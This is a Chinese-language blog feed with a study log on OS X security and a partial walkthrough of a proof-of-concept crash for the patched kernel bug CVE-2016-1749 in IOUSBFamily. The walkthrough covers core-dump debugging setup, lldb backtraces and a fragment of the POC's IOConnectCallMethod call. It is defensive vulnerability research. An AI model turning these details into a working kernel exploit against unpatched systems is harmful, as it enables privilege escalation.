<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[mrh的学习分享]]></title>
  <subtitle><![CDATA[胸口写一个勇字]]></subtitle>
  <link href="/atom.xml" rel="self"/>
  <link href="http://yoursite.com/"/>
  <updated>2016-05-23T18:56:05.000Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name><![CDATA[mrh]]></name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[10-11-4版本小结]]></title>
    <link href="http://yoursite.com/2016/05/23/10-11-4%E7%89%88%E6%9C%AC%E5%B0%8F%E7%BB%93/"/>
    <id>http://yoursite.com/2016/05/23/10-11-4版本小结/</id>
    <published>2016-05-23T18:21:22.000Z</published>
    <updated>2016-05-23T18:56:05.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_版本小结">0x00 版本小结</h1><p>在<code>10.11.4</code>版本开始着手研究<code>OS X</code>系统安全方面的知识，上周苹果发布了<code>10.11.5</code>版本，<code>10.11.4</code>版本的补丁中还有大量的漏洞没有研究完，又放出了新的版本，这里稍微做一下总结。</p>
<h1 id="0x01_10-11-4_小结">0x01 10.11.4 小结</h1><h2 id="1-1_基础知识">1.1 基础知识</h2><h3 id="1-1-1_macho格式学习">1.1.1 macho格式学习</h3><p>​    因为刚开始研究<code>OS X</code>系统，花了一部分时间研究了mach-o文件格式的知识，在后续的漏洞分析中发现，mach-o文件的知识还不够扎实，还会有很多似懂非懂的问题。</p>
<p><a href="http://turingh.github.io/2016/03/07/mach-o%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/" target="_blank" rel="external">mach-o格式分析</a></p>
<p><a href="http://turingh.github.io/2016/03/10/Mach-O%E7%9A%84%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/" target="_blank" rel="external">Mach-O的动态链接相关知识</a></p>
<p><a href="http://turingh.github.io/2016/03/22/fishhook%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" target="_blank" rel="external">fishhook源码分析</a></p>
<p><a href="http://turingh.github.io/2016/03/30/OSX%E5%86%85%E6%A0%B8%E5%8A%A0%E8%BD%BDmach-o%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/" target="_blank" rel="external">OSX内核加载mach-o流程分析</a></p>
<h3 id="1-1-2_dyld源码分析">1.1.2 dyld源码分析</h3><p><a href="http://turingh.github.io/2016/03/16/dyld%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90load/" target="_blank" rel="external">dyld源码分析-动态加载load</a></p>
<p><a href="http://turingh.github.io/2016/03/01/dyld%E4%B8%ADmacho%E5%8A%A0%E8%BD%BD%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/" target="_blank" rel="external">dyld中mach-o文件加载的简单分析</a></p>
<h2 id="1-2漏洞分析">1.2漏洞分析</h2><p>​    主要分析了两个漏洞<a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/" target="_blank" rel="external">CVE-2016-1757</a>以及<a href="http://turingh.github.io/2016/04/29/CVE-2016-1749%E5%86%85%E6%A0%B8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CPOC%E5%88%86%E6%9E%90/" target="_blank" rel="external">CVE-2016-1749</a>。两个漏洞一个是应用层一个是内核层的，在分析研究漏洞的过程中，也熟悉掌握了ida，bindiff，lldb等一系列工具的实际操作。在分析另外一个内核漏洞的过程中，发现在内核框架的掌握上有比较大的缺憾，所以花了大量的时间熟悉了内核开发与一些相关部分的源码，所以有半个月时间左右没有通过日志总结学习的小结，在<code>10.11.5</code>版本的漏洞研究时将补充相关的内容。</p>
<ul>
<li>libkern c++ 运行时源码学习</li>
<li>kext内核扩展加载流程</li>
<li>iokit框架工作的原理及细节的简单深入分析</li>
<li>mach-o的dyld中重定向的代码细节</li>
</ul>
<h1 id="0x02_10-11-5_目标">0x02 10.11.5 目标</h1><ul>
<li>提高漏洞分析的能力和速度（POC构建，EXP编写）</li>
<li>提高基础能力的学习（内核源码，系统结构）</li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_版本小结">0x00 版本小结</h1><p>在<code>10.11.4</code>版本开始着手研究<code>OS X</code>系统安全方面的知识，上周苹果发布了<code>10.11.5</code>版本，<code>10.11.4</cod]]>
    </summary>
    
      <category term="OS X" scheme="http://yoursite.com/tags/OS-X/"/>
    
      <category term="OS X" scheme="http://yoursite.com/categories/OS-X/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[CVE-2016-1749内核代码执行POC分析]]></title>
    <link href="http://yoursite.com/2016/04/29/CVE-2016-1749%E5%86%85%E6%A0%B8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CPOC%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2016/04/29/CVE-2016-1749内核代码执行POC分析/</id>
    <published>2016-04-29T16:43:50.000Z</published>
    <updated>2016-04-29T20:37:51.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p><code>OS X</code>系统的10.11.4的系统补丁中修复了一个在内核中可以导致代码执行的漏洞，漏洞形成的原因是缺少了必要的边界值检测。</p>
<ul>
<li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=728&amp;can=1&amp;q=apple&amp;sort=-id" target="_blank" rel="external">最初的漏洞报告</a></li>
<li><a href="https://bugs.chromium.org/p/project-zero/issues/attachment?aid=227076" target="_blank" rel="external">POC下载</a><br>本文记录了对POC的简单的调试和分析，对该漏洞有一个初步的认识，为后续的研究做好准备工作。</li>
</ul>
<a id="more"></a>
<h1 id="0x01_准备工作">0x01 准备工作</h1><p>因为这个漏洞是一个内核级的漏洞，所以需要搭建一个内核调试的环境。</p>
<h2 id="1-1_内核调试环境的搭建">1.1 内核调试环境的搭建</h2><p>内核调试环境的搭建并不复杂，但是需要一台装有<code>OS X</code>的虚拟机，只需要下载官方的<code>Kernel Debug Kit</code>，安装并按照<code>ReadMe.html</code>中的步骤操作即可。<br>一般情况下默认路径是<code>/Library/Developer/KDKs/KDK_10.11.3_15D13b.kdk/ReadMe.html</code></p>
<p><a href="https://developer.apple.com/downloads/" target="_blank" rel="external">KDK下载地址</a><br>也可以参考这篇文章<a href="http://www.freebuf.com/articles/system/90049.html" target="_blank" rel="external">OSX内核调试技巧分享</a></p>
<h2 id="1-2_利用lldb调试kernel_core_dump">1.2 利用lldb调试kernel core dump</h2><p>在默认情况下内核崩溃后会产生panic文件，记录这一次内核崩溃的最后调用栈，用来分析崩溃的原因，但是panic文件的信息量有限，而进行一次内核的动态调试步骤又比较复杂，这个时候对kernel core dump的分析是一种折中的方式。但是<code>OS X</code>系统生成的kernle core不能在本机保存需要设置一个服务器，在系统内核崩溃时会将core文件发送到服务器。</p>
<p>设置方法可以参考苹果给出的<a href="https://developer.apple.com/library/mac/technotes/tn2004/tn2118.html" target="_blank" rel="external">官方文档</a>，这里简单的叙述一下。在KDK的README文件中也有设置的步骤。</p>
<h3 id="1-2-1_设置服务器(物理机)">1.2.1 设置服务器(物理机)</h3><ul>
<li>创建core dump的文件夹</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">server$ sudo mkdir /PanicDumps</span><br><span class="line">Password:********</span><br><span class="line">server$ sudo chown root:wheel /PanicDumps</span><br><span class="line">server$ sudo chmod <span class="number">1777</span> /PanicDumps</span><br></pre></td></tr></table></figure>
<ul>
<li><p>启用core dump服务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">server$ sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.kdumpd.plist</span><br><span class="line">Password:********</span><br></pre></td></tr></table></figure>
</li>
<li><p>确认服务已经开启</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">server$ sudo launchctl list | grep kdump</span><br><span class="line">Password:********</span><br><span class="line"> - <span class="number">0</span>     com.apple.kdumpd</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="1-2-2_设置客户端(虚拟机)">1.2.2 设置客户端(虚拟机)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">client$ sudo nvram boot-args=<span class="string">"debug=0xd44 _panicd_ip=10.0.40.2"</span></span><br><span class="line">Password: ********</span><br></pre></td></tr></table></figure>
<p>这里的这个ip需要填物理的ip。且虚拟机可以通过该ip和物理机简历连接。</p>
<h3 id="1-2-3_使用lldb调试kernel_core">1.2.3 使用lldb调试kernel core</h3><p>当系统内核崩溃后，在物理机的<code>/PanicDumps</code>路径中会出现<code>xnu-XXX.gz</code>的文件。是通过zip压缩的。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gunzip xnu-XXX.gz</span><br></pre></td></tr></table></figure></p>
<p>通过指令解压后利用lldb查看core文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo lldb -c /PanicDumps/core-xnu-<span class="number">3248.30</span>.<span class="number">4</span>-<span class="number">172.16</span>.<span class="number">9.186</span>-ca2fd00a</span><br></pre></td></tr></table></figure></p>
<p>注意需要使用sudo，否则会报错。这个时候就可以看到core dump的情况进行分析了。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sudo lldb -c /PanicDumps/core-xnu-<span class="number">3248.30</span>.<span class="number">4</span>-<span class="number">172.16</span>.<span class="number">9.186</span>-ca2fd00a                               </span><br><span class="line">(lldb) target create --core <span class="string">"/PanicDumps/core-xnu-3248.30.4-172.16.9.186-ca2fd00a"</span></span><br><span class="line">Kernel UUID: DB8A107C-<span class="number">3</span>A4F-<span class="number">31</span>AB-<span class="number">8</span>BCE-EB77F80B1CD7</span><br><span class="line">Load Address: <span class="number">0</span>xffffff8010c00000</span><br><span class="line">warning: <span class="string">'kernel'</span> contains a debug script. To run this script <span class="keyword">in</span> this debug session:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">command</span> script import <span class="string">"/Library/Developer/KDKs/KDK_10.11.3_15D13b.kdk/System/Library/Kernels/kernel.development.dSYM/Contents/Resources/DWARF/../Python/kernel.py"</span></span><br><span class="line"></span><br><span class="line">To run all discovered debug scripts <span class="keyword">in</span> this session:</span><br><span class="line"></span><br><span class="line">    settings <span class="built_in">set</span> target.load-script-from-symbol-file <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">Kernel slid <span class="number">0</span>x10a00000 <span class="keyword">in</span> memory.</span><br><span class="line">Loaded kernel file /Library/Developer/KDKs/KDK_10.<span class="number">11.3</span>_15D13b.kdk/System/Library/Kernels/kernel.development</span><br><span class="line">Loading <span class="number">97</span> kext modules warning: Can<span class="string">'t find binary/dSYM for com.apple.kec.corecrypto (D6E082B5-93B2-3FF0-AB4B-4AA310173CE8)</span><br><span class="line">.....warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.AppleACPIPlatform (<span class="number">3</span>BE4E926-E063-<span class="number">3</span>BBD-BE05-F6F97358C7A4)</span><br><span class="line">....warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.DiskImages (97177A33-27BD-34A9-9B42-1173BE480BCD)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.AppleCredentialManager (E3817462-FFEE-<span class="number">38</span>AE-<span class="number">839</span>B-<span class="number">79932133</span>E7EF)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.AppleMobileFileIntegrity (09620E73-2D73-3F62-9E5D-4B9DC2147F70)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.AppleKeyStore (<span class="number">7</span>AF14D78-EEBE-<span class="number">3474</span>-B605-<span class="number">66</span>CC957F2FE5)</span><br><span class="line">...warning: Can<span class="string">'t find binary/dSYM for com.apple.security.sandbox (F3202072-6ED5-33BF-97B0-AD49F500ABF6)</span><br><span class="line">...warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.AppleAPIC (<span class="number">46368557</span>-CAF1-<span class="number">3</span>FAC-AF62-A03389987023)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.AppleSMBIOS (558EB25D-8E3F-3429-B2DC-ADAE2EF0F7C3)</span><br><span class="line">...warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.AppleACPIButtons (<span class="number">767834</span>A6-B80F-<span class="number">36</span>ED-<span class="number">9</span>C0A-A6179A144279)</span><br><span class="line">....warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.AppleUSBHostMergeProperties (D338A98F-2B8F-3411-BD87-BD00F620A223)</span><br><span class="line">.......warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.AppleFileSystemDriver (<span class="number">998</span>B4AF6-<span class="number">388</span>A-<span class="number">304</span>E-<span class="number">9627</span>-EBB1237252F8)</span><br><span class="line">...warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.Intel82574L (92C2095F-4CB1-36CE-ACF9-518F4610AE68)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.usb.AppleUSBXHCI (<span class="number">38</span>F68C79-<span class="number">811</span>D-<span class="number">3</span>AA2-B8D4-<span class="number">0</span>D444FF4DB4B)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.usb.AppleUSBXHCIPCI (7AC984CE-8AAA-3B8D-92E3-24BE18DF3DEC)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.usb.AppleUSBEHCI (FA569D7A-D439-<span class="number">32</span>EB-<span class="number">9</span>B57-<span class="number">0</span>A5D5227AC12)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.usb.AppleUSBUHCI (55F5C3FB-6419-35F2-B9A3-836F696C3DBC)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.usb.AppleUSBUHCIPCI (<span class="number">4</span>C589408-<span class="number">0</span>FA4-<span class="number">35</span>A0-B8BF-A65EEDFB971F)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.usb.AppleUSBEHCIPCI (C2569C25-E38A-3AC0-8502-594A75E63C76)</span><br><span class="line">..warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.AppleAHCIPort (<span class="number">20356</span>FAA-<span class="number">8898</span>-<span class="number">36</span>F8-BAAD-<span class="number">8961</span>AFC23E9B)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.apple.iokit.IOAHCIBlockStorage (0A852267-0F62-363B-86D7-C2B02972EE48)</span><br><span class="line">..warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.iokit.IOAHCISerialATAPI (D1CA586E-<span class="number">89</span>CA-<span class="number">36</span>BE-A293-CE0BBD19367D)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.AppleXsanScheme (00C3E9DA-99B0-3518-8B4B-38114EE146A8)</span><br><span class="line">......warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.usb.AppleUSBHostCompositeDevice (<span class="number">3</span>E1A0840-<span class="number">033</span>C-<span class="number">321</span>B-B5ED-<span class="number">7</span>BEA6996B1E0)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.usb.AppleUSBHub (271D9C2E-FF74-3503-958E-24C554595575)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.usb.IOUSBHostHIDDevice (<span class="number">65</span>F7A241-C50F-<span class="number">3370</span>-<span class="number">9</span>CE8-<span class="number">54566</span>F0130DE)</span><br><span class="line">..warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.AppleSMC (535447F9-30E0-39BA-A2B8-1A027DED5D53)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.vecLib.kext (E62681B7-BE2F-<span class="number">3</span>F89-<span class="number">8065</span>-<span class="number">91</span>C5C2876EBA)</span><br><span class="line">..warning: Can<span class="string">'t find binary/dSYM for com.apple.iokit.IOHDAFamily (3BF83381-C3DA-3EC4-BBE6-F2024D3EACC7)</span><br><span class="line">..warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.AppleHDAController (AC7816C9-DEF7-<span class="number">310</span>A-B059-<span class="number">5852</span>BF07A843)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.apple.iokit.IOBluetoothFamily (022A55C7-EF37-3BE7-AC09-0436CDEFCE95)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.iokit.IOBluetoothHostControllerUSBTransport (<span class="number">67</span>B0326E-F86A-<span class="number">3</span>AEF-BE41-<span class="number">99958414</span>F094)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.vmware.kext.VMwareGfx (00FD0C5F-0A29-3656-8718-EBF372456B8E)</span><br><span class="line">....warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.AppleHV (<span class="number">8</span>E08FFC5-<span class="number">4</span>E33-<span class="number">3</span>D66-BB9B-<span class="number">2</span>EC170B650E6)</span><br><span class="line">.....warning: Can<span class="string">'t find binary/dSYM for com.apple.iokit.IOBluetoothSerialManager (A6A7E1A3-4063-3C42-9984-67E3BB1A0191)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.iokit.IOSurface (<span class="number">5</span>D984125-CEC9-<span class="number">39</span>B6-BA6E-<span class="number">6</span>C6C6004552C)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.apple.iokit.IOUserEthernet (6D2530ED-C0BC-3F64-B2FC-4490CC30BC06)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.pmtelemetry (C3F2C16A-A407-<span class="number">389</span>C-AD2B-B8582742FE5E)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.IOPlatformPluginFamily (EC53D03F-6CD9-383A-8160-33E02C141EAA)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.IOPlatformPluginLegacy (<span class="number">15</span>BBAC18-<span class="number">907</span>A-<span class="number">394</span>F-BA5B-CC40E055BA13)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.ACPI_SMC_PlatformPlugin (04F77CAB-EA07-362C-B7A2-0167D56D55BC)</span><br><span class="line">..warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.AppleSMBusController (<span class="number">04</span>C9295B-<span class="number">23</span>E8-<span class="number">388</span>B-<span class="number">8</span>BB6-<span class="number">07</span>CC377CADD2)</span><br><span class="line">....warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.DspFuncLib (F1E07A68-221D-3ED3-A2BA-1735E0582F3F)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.AppleHDA (<span class="number">344</span>D4A99-D22C-<span class="number">3</span>E43-<span class="number">9699</span>-<span class="number">82</span>C1B7044CE2)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.AppleHDAHardwareConfigDriver (EDCBE684-9F4F-349A-9E17-D1704C26BD84)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.AppleOSXWatchdog (<span class="number">0</span>CE80268-ACDD-<span class="number">3</span>FCC-<span class="number">8370</span>-<span class="number">8</span>A041468F898)</span><br><span class="line">....warning: Can<span class="string">'t find binary/dSYM for com.vmware.kext.vmmemctl (C2161D7F-F967-3406-A377-CD7D11EDE95A)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.vmware.kext.vmhgfs (<span class="number">22192699</span>-<span class="number">95</span>BC-<span class="number">3</span>ACC-<span class="number">96</span>B1-<span class="number">023</span>E6C6073AA)</span><br><span class="line">.. done.</span><br><span class="line">Core file <span class="string">'/PanicDumps/core-xnu-3248.30.4-172.16.9.186-ca2fd00a'</span> (x86_64) was loaded.</span><br><span class="line">(lldb) bt</span><br><span class="line">IOUSBFamily was compiled with optimization - stepping may behave oddly; variables may not be available.</span><br><span class="line">* thread <span class="comment">#1: tid = 0x0000, 0xffffff7f91b11581 IOUSBFamily`AppleUSBPipe::Abort(this=&lt;unavailable&gt;, streamID=&lt;unavailable&gt;) + 153 at AppleUSBPipe.cpp:1181, stop reason = signal SIGSTOP</span></span><br><span class="line">  * frame <span class="comment">#0: 0xffffff7f91b11581 IOUSBFamily`AppleUSBPipe::Abort(this=&lt;unavailable&gt;, streamID=&lt;unavailable&gt;) + 153 at AppleUSBPipe.cpp:1181 [opt]</span></span><br><span class="line">    frame <span class="comment">#1: 0xffffff7f91b01197 IOUSBFamily`IOUSBInterfaceUserClient::AbortStreamsPipe(this=&lt;unavailable&gt;, pipeRef=&lt;unavailable&gt;, streamID=4042322160) + 305 at IOUSBInterfaceUserClient.cpp:3656 [opt]</span></span><br><span class="line">    frame <span class="comment">#2: 0xffffff7f91afbcf9 IOUSBFamily`IOUSBInterfaceUserClient::_AbortStreamsPipe(target=&lt;unavailable&gt;, reference=&lt;unavailable&gt;, arguments=&lt;unavailable&gt;) + 241 at IOUSBInterfaceUserClient.cpp:3636 [opt]</span></span><br><span class="line">    frame <span class="comment">#3: 0xffffff80112b9c17 kernel.development`::is_io_connect_method(connection=0xffffff801a719c00, selector=36, scalar_input=&lt;unavailable&gt;, scalar_inputCnt=&lt;unavailable&gt;, inband_input=&lt;unavailable&gt;, inband_inputCnt=0, ool_input=&lt;unavailable&gt;, ool_input_size=&lt;unavailable&gt;, inband_output=&lt;unavailable&gt;, inband_outputCnt=&lt;unavailable&gt;, scalar_output=&lt;unavailable&gt;, scalar_outputCnt=&lt;unavailable&gt;, ool_output=&lt;unavailable&gt;, ool_output_size=&lt;unavailable&gt;) + 487 at IOUserClient.cpp:3720 [opt]</span></span><br><span class="line">    frame <span class="comment">#4: 0xffffff8010d5cfc0 kernel.development`_Xio_connect_method(InHeadP=&lt;unavailable&gt;, OutHeadP=0xffffff80195c55d0) + 384 at device_server.c:8255 [opt]</span></span><br><span class="line">    frame <span class="comment">#5: 0xffffff8010c88ee3 kernel.development`ipc_kobject_server(request=0xffffff801c7f3be0) + 259 at ipc_kobject.c:340 [opt]</span></span><br><span class="line">    frame <span class="comment">#6: 0xffffff8010c64e13 kernel.development`ipc_kmsg_send(kmsg=&lt;unavailable&gt;, option=&lt;unavailable&gt;, send_timeout=0) + 195 at ipc_kmsg.c:1441 [opt]</span></span><br><span class="line">    frame <span class="comment">#7: 0xffffff8010c7b435 kernel.development`mach_msg_overwrite_trap(args=&lt;unavailable&gt;) + 197 at mach_msg.c:470 [opt]</span></span><br><span class="line">    frame <span class="comment">#8: 0xffffff8010d83850 kernel.development`mach_call_munger64(state=0xffffff801b6471e0) + 480 at bsd_i386.c:560 [opt]</span></span><br><span class="line">    frame <span class="comment">#9: 0xffffff8010db9516 kernel.development`hndl_mach_scall64 + 22</span></span><br><span class="line">(lldb)</span><br></pre></td></tr></table></figure></p>
<p>可以清楚的看到系统崩溃时的调用栈了。这个栈就是POC程序在虚拟机中执行后返回的结果。</p>
<h1 id="0x02_POC崩溃现场分析">0x02 POC崩溃现场分析</h1><p>通过对POC执行后崩溃的现场，可以得知具体的崩溃原因，已经函数的调用顺序，这样在做动态分析和静态分析的时候才能有的放矢。</p>
<h2 id="2-1_调用栈分析">2.1 调用栈分析</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">* frame <span class="comment">#0: 0xffffff7f91b11581 IOUSBFamily`AppleUSBPipe::Abort(this=&lt;unavailable&gt;, streamID=&lt;unavailable&gt;) + 153 at AppleUSBPipe.cpp:1181 [opt]</span></span><br><span class="line">  frame <span class="comment">#1: 0xffffff7f91b01197 IOUSBFamily`IOUSBInterfaceUserClient::AbortStreamsPipe(this=&lt;unavailable&gt;, pipeRef=&lt;unavailable&gt;, streamID=4042322160) + 305 at IOUSBInterfaceUserClient.cpp:3656 [opt]</span></span><br><span class="line">  frame <span class="comment">#2: 0xffffff7f91afbcf9 IOUSBFamily`IOUSBInterfaceUserClient::_AbortStreamsPipe(target=&lt;unavailable&gt;, reference=&lt;unavailable&gt;, arguments=&lt;unavailable&gt;) + 241 at IOUSBInterfaceUserClient.cpp:3636 [opt]</span></span><br><span class="line">  frame <span class="comment">#3: 0xffffff80112b9c17 kernel.development`::is_io_connect_method(connection=0xffffff801a719c00, selector=36, scalar_input=&lt;unavailable&gt;, scalar_inputCnt=&lt;unavailable&gt;, inband_input=&lt;unavailable&gt;, inband_inputCnt=0, ool_input=&lt;unavailable&gt;, ool_input_size=&lt;unavailable&gt;, inband_output=&lt;unavailable&gt;, inband_outputCnt=&lt;unavailable&gt;, scalar_output=&lt;unavailable&gt;, scalar_outputCnt=&lt;unavailable&gt;, ool_output=&lt;unavailable&gt;, ool_output_size=&lt;unavailable&gt;) + 487 at IOUserClient.cpp:3720 [opt]</span></span><br><span class="line">  frame <span class="comment">#4: 0xffffff8010d5cfc0 kernel.development`_Xio_connect_method(InHeadP=&lt;unavailable&gt;, OutHeadP=0xffffff80195c55d0) + 384 at device_server.c:8255 [opt]</span></span><br><span class="line">  frame <span class="comment">#5: 0xffffff8010c88ee3 kernel.development`ipc_kobject_server(request=0xffffff801c7f3be0) + 259 at ipc_kobject.c:340 [opt]</span></span><br><span class="line">  frame <span class="comment">#6: 0xffffff8010c64e13 kernel.development`ipc_kmsg_send(kmsg=&lt;unavailable&gt;, option=&lt;unavailable&gt;, send_timeout=0) + 195 at ipc_kmsg.c:1441 [opt]</span></span><br><span class="line">  frame <span class="comment">#7: 0xffffff8010c7b435 kernel.development`mach_msg_overwrite_trap(args=&lt;unavailable&gt;) + 197 at mach_msg.c:470 [opt]</span></span><br><span class="line">  frame <span class="comment">#8: 0xffffff8010d83850 kernel.development`mach_call_munger64(state=0xffffff801b6471e0) + 480 at bsd_i386.c:560 [opt]</span></span><br><span class="line">  frame <span class="comment">#9: 0xffffff8010db9516 kernel.development`hndl_mach_scall64 + 22</span></span><br></pre></td></tr></table></figure>
<p>结合<code>frame #3</code>的信息，以及poc中的相关代码段<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//...</span></span><br><span class="line">  err = IOConnectCallMethod(</span><br><span class="line">   conn,</span><br><span class="line">   <span class="number">36</span>,</span><br><span class="line">   inputScalar,</span><br><span class="line">   inputScalarCnt,</span><br><span class="line">   inputStruct,</span><br><span class="line">   inputStructCnt,</span><br><span class="line">   outputScalar,</span><br><span class="line">   &amp;outputScalarCnt,</span><br><span class="line">   outputStruct,</span><br><span class="line">   &amp;outputStructCnt); </span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure></p>
<ul>
